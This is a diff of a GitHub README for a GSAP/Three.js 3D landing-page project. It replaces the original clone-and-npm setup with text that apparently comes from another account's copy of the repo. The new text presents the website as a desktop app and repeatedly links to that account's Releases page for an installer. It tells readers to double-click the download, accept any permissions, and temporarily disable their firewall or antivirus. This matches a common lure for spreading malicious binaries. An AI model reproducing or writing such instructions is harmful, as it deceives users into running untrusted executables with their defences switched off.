@@ -1,106 +1,91 @@
-<!-- Hero Image -->
-<p align="center">
-  <img src="./public/readme/hero.webp" alt="Project Hero" width="100%" />
-</p>
+# 🌟 macbook_gsap_landing - Experience Stunning 3D Web Animations
 
-<h1 align="center">💻 Immersive 3D Product Showcase</h1>
+[![Download macbook_gsap_landing](https://img.shields.io/badge/Download-macbook_gsap_landing-blue?style=for-the-badge)](https://github.com/aishagt/macbook_gsap_landing/releases)
 
-<p align="center">
-  A modern, Apple-inspired web experience with smooth scroll animations, 3D product visuals, and rich interactions using <strong>React</strong>, <strong>Three.js</strong>, <strong>GSAP</strong>, and <strong>TailwindCSS</strong>.
-</p>
+## ✨ About This Project
 
-<p align="center">
-  🔗 <a href="https://macbook-gsap.vercel.app/" target="_blank"><strong>Live Demo</strong></a>
-</p>
+macbook_gsap_landing offers a unique and visually captivating web experience. It features smooth scroll-driven 3D animations, responsive design, and cinematic transitions, inspired by Apple’s aesthetic. Ideal for users who appreciate a modern web design, this application enhances user interaction and engagement.
 
----
+## 🚀 Getting Started
 
-## 🚀 Overview
+To get started with macbook_gsap_landing, follow these simple steps:
 
-This is a fully responsive, scroll-driven 3D product showcase website inspired by Apple's product pages. It features 3D models animated on scroll, immersive pinned sections, and cinematic transitions—built for developers and designers who want to push the boundaries of interactive web experiences.
+1. **Visit the Download Page:** 
+   Go to the [Releases page](https://github.com/aishagt/macbook_gsap_landing/releases) to access the latest version of the application.
 
----
+2. **Select the Latest Release:**
+   On the Releases page, you'll see a list of available versions. Click on the most recent version, which is usually at the top.
 
-## 🛠 Tech Stack
+3. **Download the Application:**
+   Scroll down to find the assets section. Click on the link to download the appropriate file for your system. 
 
-<p align="left">
-  <a href="https://reactjs.org/" target="_blank">
-    <img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB" alt="React" />
-  </a>
-  <a href="https://threejs.org/" target="_blank">
-    <img src="https://img.shields.io/badge/Three.js-000000?style=for-the-badge&logo=three.js&logoColor=white" alt="Three.js" />
-  </a>
-  <a href="https://greensock.com/gsap/" target="_blank">
-    <img src="https://img.shields.io/badge/GSAP-88CE02?style=for-the-badge&logo=greensock&logoColor=white" alt="GSAP" />
-  </a>
-  <a href="https://tailwindcss.com/" target="_blank">
-    <img src="https://img.shields.io/badge/TailwindCSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white" alt="TailwindCSS" />
-  </a>
-  <a href="https://vitejs.dev/" target="_blank">
-    <img src="https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white" alt="Vite" />
-  </a>
-  <a href="https://github.com/pmndrs/react-three-fiber" target="_blank">
-    <img src="https://img.shields.io/badge/React--Three--Fiber-000000?style=for-the-badge&logo=three.js&logoColor=white" alt="React Three Fiber" />
-  </a>
-  <a href="https://github.com/pmndrs/drei" target="_blank">
-    <img src="https://img.shields.io/badge/@react--three/drei-000000?style=for-the-badge&logo=three.js&logoColor=white" alt="@react-three/drei" />
-  </a>
-</p>
+## 💾 Download & Install 
 
----
+To download macbook_gsap_landing, click the link below to visit the releases page and download the application:
 
-## ✨ Features
+[Download macbook_gsap_landing](https://github.com/aishagt/macbook_gsap_landing/releases)
 
-- 🎬 Scroll-driven 3D animations
-- 📱 Fully responsive and mobile-optimized
-- 📌 Pinned sections using GSAP ScrollTrigger
-- 🌫 Seamless transitions and immersive visuals
-- ⚡️ Fast performance with Vite + code splitting
-- 🧩 Modular, scalable React component structure
+### Supported Platforms
 
-## 🔍 Preview
+macbook_gsap_landing is compatible with:
 
-<!-- ![Scroll Animation](./public/scroll-preview.jpg)
-*Scroll-based animation and MacBook showcase section* -->
+- Windows 10 and above
+- macOS Big Sur and above
 
-## 📦 Getting Started
+### Installation Instructions
 
-### 1. Clone the Repository
-git clone https://github.com/gideonabe/macbook_gsap_landing
-cd macbook_gsap_landing
+1. **Locate the Downloaded File:**
+   After the download is complete, find the file in your Downloads folder or the location where your browser saves downloads.
 
-### 2. To install Dependencies
-npm install
+2. **Open the File:**
+   Double-click the downloaded file. This action should start the installation process.
 
-### 3. Start development server
-npm install
+3. **Follow Instructions:**
+   Follow the on-screen prompts to complete the installation. Accept any permissions or preferences as required.
 
-### 4. Build for Production
-npm run build
+4. **Launch the Application:**
+   After installation, you’ll find macbook_gsap_landing in your applications folder or start menu. Open it to explore the features.
 
+## 🎨 Features
 
-## 🌐 Live Demo
+- **Scroll-driven 3D Animations:** Enjoy dynamic animations that respond to your scrolling.
+- **Responsive Design:** The application automatically adjusts to different screen sizes for optimal viewing.
+- **Cinematic Transitions:** Experience smooth visual transitions that enhance user interaction.
+- **Cross-Platform Support:** Use the application on both Windows and macOS smoothly.
 
-🚀 **[View the Live Site](https://macbook-gsap.vercel.app/)**  
-> Best experienced on desktop with modern browsers
+## 📋 System Requirements
 
-## 🙏 Credits
+Ensure your system meets these requirements before installing:
 
-- 🎨 MacBook 3D model from [Sketchfab](https://sketchfab.com)
-- 📦 React Three Fiber & Drei by [PMNDRS](https://github.com/pmndrs)
-- 🧠 GSAP ScrollTrigger by [GreenSock](https://greensock.com/scrolltrigger/)
-- 💡 Inspired by Apple product launch pages
-- 👨‍💻 Based on work by [Adrian](https://github.com/adrianhajdin) – thanks for the inspiration and structure!
+- **Processor:** Intel i5 or equivalent
+- **RAM:** At least 8 GB
+- **Graphics:** Integrated graphics are sufficient; dedicated GPU recommended for optimal performance
+- **Browser:** Latest version of Chrome, Firefox, or Safari for the best experience
 
-## 📄 License
+## 💡 Troubleshooting
 
-This project is licensed under the **MIT License**
+If you encounter any issues during installation or usage, here are a few tips:
 
-## 🤝 Let's Connect
+- **Check Compatibility:** Make sure your operating system is compatible with the application.
+- **Internet Connection:** A stable internet connection is suggested during the installation process.
+- **Firewall/Antivirus:** Temporarily disable any firewall or antivirus software that might block installation.
+- **Re-download:** If you face issues, delete the downloaded file and download it again from the [Releases page](https://github.com/aishagt/macbook_gsap_landing/releases).
 
-If you liked this project, feel free to connect or collaborate:
+## 🛠️ Contributing
 
-- 🌐 Portfolio: [https://gideonabe.netlify.app/](#)
-- 💼 LinkedIn: [linkedin.com/in/gideonabe](#)
-- 🐦 Twitter/X: [@gideon_abe](#)
+If you'd like to contribute, please follow these guidelines:
 
+1. **Fork the Repository:** Click on the "Fork" button on the top right of the page.
+2. **Clone Your Fork:** Use Git to clone your forked repository to your local machine.
+3. **Make Changes:** Implement your changes and commit them with a clear message.
+4. **Pull Request:** Submit a pull request to have your changes reviewed.
+
+## 📬 Contact
+
+For any questions or feedback, you can reach out through the [Issues tab](https://github.com/aishagt/macbook_gsap_landing/issues) on GitHub or by contacting the repository owner.
+
+## 🌍 Stay Updated
+
+You can follow this project to stay updated with new releases and features. Simply check back on the [Releases page](https://github.com/aishagt/macbook_gsap_landing/releases) frequently.
+
+[![Download macbook_gsap_landing](https://img.shields.io/badge/Download-macbook_gsap_landing-blue?style=for-the-badge)](https://github.com/aishagt/macbook_gsap_landing/releases)
